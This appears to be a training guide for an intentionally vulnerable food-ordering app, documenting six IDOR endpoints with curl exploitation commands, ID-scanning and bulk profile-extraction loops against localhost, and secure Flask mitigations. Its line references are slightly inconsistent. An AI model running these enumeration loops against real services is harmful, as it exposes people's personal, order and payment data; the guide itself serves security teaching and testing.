# Insecure Direct Object Reference (IDOR) Vulnerabilities Guide

This guide documents the Insecure Direct Object Reference vulnerabilities intentionally introduced in the VulnEats food ordering system for educational purposes.

## ⚠️ WARNING
These vulnerabilities are **INTENTIONALLY INTRODUCED** for cybersecurity education. Never implement these in production systems!

## Vulnerability Summary

| Vulnerability | Severity | Location | Description |
|---------------|----------|----------|-------------|
| User Profile Access | **HIGH** | `/api/user/<user_id>/profile` | Access any user's profile information |
| Order Details Access | **HIGH** | `/api/order/<order_id>/details` | Access any user's order details |
| User Cart Access | **MEDIUM** | `/api/user/<user_id>/cart` | Access any user's shopping cart |
| Payment Details Access | **CRITICAL** | `/api/payment/<tx_ref>/details` | Access any user's payment information |
| Restaurant Management | **HIGH** | `/api/restaurant/<restaurant_id>/manage` | Access any restaurant's management data |
| User Orders Access | **HIGH** | `/api/user/<user_id>/orders` | Access any user's order history |

## What is Insecure Direct Object Reference (IDOR)?

Insecure Direct Object Reference (IDOR) is a type of access control vulnerability that occurs when an application provides direct access to objects based on user-supplied input. Attackers can manipulate these references to access unauthorized data.

### Key Characteristics:
- **Direct Object References**: URLs or parameters that directly reference database objects
- **Missing Authorization**: No verification that the user has permission to access the object
- **Predictable Patterns**: Object IDs that follow predictable sequences (1, 2, 3, etc.)
- **Sensitive Data Exposure**: Access to other users' personal information, orders, payments, etc.

## Detailed Vulnerability Analysis

### 1. User Profile Access (HIGH)

**Location:** `backend/app.py` lines 652-687

**Vulnerability:** The `/api/user/<user_id>/profile` endpoint allows any authenticated user to access any other user's profile information.

**Exploitation Examples:**
```bash
# Access any user's profile (requires authentication)
curl "http://localhost:5001/api/user/1/profile" \
  -H "Cookie: session=your_session_cookie"

# Access admin user profile
curl "http://localhost:5001/api/user/999/profile" \
  -H "Cookie: session=your_session_cookie"

# Access other customers' profiles
curl "http://localhost:5001/api/user/2/profile" \
  -H "Cookie: session=your_session_cookie"
```

**Impact:** Sensitive user information disclosure including email addresses, roles, and account creation dates.

### 2. Order Details Access (HIGH)

**Location:** `backend/app.py` lines 1448-1506

**Vulnerability:** The `/api/order/<order_id>/details` endpoint allows any authenticated user to access any order's complete details.

**Exploitation Examples:**
```bash
# Access any order details
curl "http://localhost:5001/api/order/1/details" \
  -H "Cookie: session=your_session_cookie"

# Access high-value orders
curl "http://localhost:5001/api/order/100/details" \
  -H "Cookie: session=your_session_cookie"

# Access orders from other users
curl "http://localhost:5001/api/order/50/details" \
  -H "Cookie: session=your_session_cookie"
```

**Impact:** Complete order information disclosure including customer details, payment information, and order items.

### 3. User Cart Access (MEDIUM)

**Location:** `backend/app.py` lines 1655-1653

**Vulnerability:** The `/api/user/<user_id>/cart` endpoint allows any authenticated user to view any other user's shopping cart.

**Exploitation Examples:**
```bash
# Access any user's cart
curl "http://localhost:5001/api/user/1/cart" \
  -H "Cookie: session=your_session_cookie"

# Monitor other users' shopping behavior
curl "http://localhost:5001/api/user/5/cart" \
  -H "Cookie: session=your_session_cookie"
```

**Impact:** Shopping behavior analysis, potential competitive intelligence, and privacy violation.

### 4. Payment Details Access (CRITICAL)

**Location:** `backend/app.py` lines 1550-1600

**Vulnerability:** The `/api/payment/<tx_ref>/details` endpoint allows any authenticated user to access any payment transaction details.

**Exploitation Examples:**
```bash
# Access any payment details using transaction reference
curl "http://localhost:5001/api/payment/vulneats-abc123/details" \
  -H "Cookie: session=your_session_cookie"

# Access payment information from other users
curl "http://localhost:5001/api/payment/vulneats-def456/details" \
  -H "Cookie: session=your_session_cookie"
```

**Impact:** Financial information disclosure, payment method exposure, and transaction history access.

### 5. Restaurant Management (HIGH)

**Location:** `backend/app.py` lines 1655-1714

**Vulnerability:** The `/api/restaurant/<restaurant_id>/manage` endpoint allows restaurant owners to access other restaurants' management data.

**Exploitation Examples:**
```bash
# Access any restaurant's management data (requires owner role)
curl "http://localhost:5001/api/restaurant/1/manage" \
  -H "Cookie: session=your_owner_session_cookie"

# Access competitor's restaurant data
curl "http://localhost:5001/api/restaurant/2/manage" \
  -H "Cookie: session=your_owner_session_cookie"
```

**Impact:** Business intelligence gathering, competitor analysis, and sensitive business data exposure.

### 6. User Orders Access (HIGH)

**Location:** `backend/app.py` lines 1716-1771

**Vulnerability:** The `/api/user/<user_id>/orders` endpoint allows any authenticated user to access any other user's complete order history.

**Exploitation Examples:**
```bash
# Access any user's order history
curl "http://localhost:5001/api/user/1/orders" \
  -H "Cookie: session=your_session_cookie"

# Access admin's order history
curl "http://localhost:5001/api/user/999/orders" \
  -H "Cookie: session=your_session_cookie"

# Access other customers' order history
curl "http://localhost:5001/api/user/3/orders" \
  -H "Cookie: session=your_session_cookie"
```

**Impact:** Complete purchase history disclosure, spending patterns analysis, and privacy violation.

## Advanced Exploitation Techniques

### 1. Sequential ID Scanning
```bash
# Scan for user profiles
for i in {1..100}; do
  curl "http://localhost:5001/api/user/$i/profile" \
    -H "Cookie: session=your_session_cookie"
done

# Scan for orders
for i in {1..50}; do
  curl "http://localhost:5001/api/order/$i/details" \
    -H "Cookie: session=your_session_cookie"
done
```

### 2. Parameter Manipulation
```bash
# Try different user IDs
curl "http://localhost:5001/api/user/999/profile"  # Admin user
curl "http://localhost:5001/api/user/1/profile"    # First user
curl "http://localhost:5001/api/user/0/profile"    # Edge case
```

### 3. Bulk Data Extraction
```bash
# Extract all user profiles
for user_id in $(seq 1 10); do
  curl "http://localhost:5001/api/user/$user_id/profile" \
    -H "Cookie: session=your_session_cookie" > "user_${user_id}_profile.json"
done
```

## Testing the Vulnerabilities

### Prerequisites
1. Start the backend server: `cd backend && python app.py`
2. Create multiple user accounts with different roles
3. Create some orders and payments
4. Have valid session cookies

### Testing Steps

1. **Test User Profile IDOR:**
   ```bash
   # Login as a regular user
   curl -X POST "http://localhost:5001/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "customer1", "password": "password"}' \
     -c cookies.txt
   
   # Try to access other users' profiles
   curl "http://localhost:5001/api/user/1/profile" -b cookies.txt
   curl "http://localhost:5001/api/user/2/profile" -b cookies.txt
   ```

2. **Test Order Details IDOR:**
   ```bash
   # Access different order IDs
   curl "http://localhost:5001/api/order/1/details" -b cookies.txt
   curl "http://localhost:5001/api/order/2/details" -b cookies.txt
   ```

3. **Test Cart Access IDOR:**
   ```bash
   # Access different users' carts
   curl "http://localhost:5001/api/user/1/cart" -b cookies.txt
   curl "http://localhost:5001/api/user/2/cart" -b cookies.txt
   ```

4. **Test Payment Details IDOR:**
   ```bash
   # Access payment details (need valid tx_ref)
   curl "http://localhost:5001/api/payment/vulneats-abc123/details" -b cookies.txt
   ```

5. **Test Restaurant Management IDOR:**
   ```bash
   # Login as restaurant owner
   curl -X POST "http://localhost:5001/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "owner1", "password": "password"}' \
     -c owner_cookies.txt
   
   # Access different restaurants
   curl "http://localhost:5001/api/restaurant/1/manage" -b owner_cookies.txt
   curl "http://localhost:5001/api/restaurant/2/manage" -b owner_cookies.txt
   ```

## Educational Objectives

These vulnerabilities help students learn:

1. **IDOR Concepts:** Understanding direct object reference vulnerabilities
2. **Authorization Failures:** Importance of proper access control checks
3. **Data Privacy:** Risks of exposing user data to unauthorized access
4. **Business Logic Flaws:** How missing authorization checks create vulnerabilities
5. **Attack Techniques:** Methods for exploiting IDOR vulnerabilities
6. **Impact Assessment:** Understanding the business impact of data exposure

## Mitigation Strategies

### 1. Proper Authorization Checks
```python
@app.get('/api/user/<int:user_id>/profile')
@login_required_json
def api_user_profile(user_id: int):
    # SECURE: Check if user can access this profile
    if session['user_id'] != user_id and session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized access'}), 403
    
    # Rest of the code...
```

### 2. Object Ownership Validation
```python
@app.get('/api/order/<int:order_id>/details')
@login_required_json
def api_order_details(order_id: int):
    conn = get_db_connection()
    try:
        # SECURE: Check if user owns this order
        order = conn.execute('''
            SELECT user_id FROM orders WHERE id = ?
        ''', (order_id,)).fetchone()
        
        if not order or order['user_id'] != session['user_id']:
            return jsonify({'error': 'Order not found'}), 404
        
        # Rest of the code...
    finally:
        conn.close()
```

### 3. Role-Based Access Control
```python
@app.get('/api/restaurant/<int:restaurant_id>/manage')
@owner_required_json
def api_restaurant_manage(restaurant_id: int):
    conn = get_db_connection()
    try:
        # SECURE: Check if user owns this restaurant
        restaurant = conn.execute('''
            SELECT owner_id FROM restaurants WHERE id = ?
        ''', (restaurant_id,)).fetchone()
        
        if not restaurant or restaurant['owner_id'] != session['user_id']:
            return jsonify({'error': 'Restaurant not found'}), 404
        
        # Rest of the code...
    finally:
        conn.close()
```

### 4. Indirect Object References
```python
# Instead of using sequential IDs, use UUIDs or hashed references
@app.get('/api/order/<order_uuid>/details')
def api_order_details(order_uuid: str):
    # Map UUID to internal order ID and validate ownership
    pass
```

### 5. Input Validation and Sanitization
```python
def validate_object_access(user_id: int, object_owner_id: int, user_role: str = None):
    """Validate if user can access the object"""
    # User can access their own objects
    if user_id == object_owner_id:
        return True
    
    # Admin can access any object
    if user_role == 'admin':
        return True
    
    # No other access allowed
    return False
```

## Security Best Practices

1. **Always validate object ownership** before allowing access
2. **Implement proper authorization checks** for all object references
3. **Use indirect object references** (UUIDs, hashed IDs) instead of sequential IDs
4. **Apply principle of least privilege** - users should only access their own data
5. **Implement role-based access control** consistently
6. **Log all object access attempts** for monitoring
7. **Use whitelist-based authorization** rather than blacklist
8. **Regular security testing** to identify IDOR vulnerabilities
9. **Code reviews** to catch authorization flaws
10. **Automated testing** for access control violations

## Common Attack Patterns

1. **Sequential ID Scanning:** `user/1`, `user/2`, `user/3`, etc.
2. **Predictable Patterns:** Using known ID formats
3. **Parameter Manipulation:** Changing IDs in URLs or parameters
4. **Bulk Data Extraction:** Automating access to multiple objects
5. **Role Confusion:** Exploiting different user roles
6. **Session Manipulation:** Using other users' sessions

## Business Impact

IDOR vulnerabilities can lead to:

- **Data Privacy Violations:** Unauthorized access to personal information
- **Financial Information Exposure:** Access to payment and transaction data
- **Business Intelligence Theft:** Competitor data access
- **Regulatory Compliance Issues:** GDPR, CCPA violations
- **Reputation Damage:** Loss of customer trust
- **Legal Liability:** Potential lawsuits and fines

## Conclusion

Insecure Direct Object Reference vulnerabilities are among the most common and dangerous web application security issues. They can lead to:

- **Massive data breaches**
- **Privacy violations**
- **Financial fraud**
- **Business intelligence theft**
- **Regulatory compliance issues**

These vulnerabilities demonstrate the critical importance of:

- **Proper authorization checks**
- **Object ownership validation**
- **Role-based access control**
- **Input validation and sanitization**
- **Security testing and code reviews**

Students can use this system to:

- Practice identifying IDOR vulnerabilities
- Learn various exploitation techniques
- Understand authorization bypass methods
- Develop skills in secure coding practices
- Perform penetration testing exercises
- Understand business impact of data exposure

Remember: These vulnerabilities are for educational purposes only. Always follow security best practices in production systems!
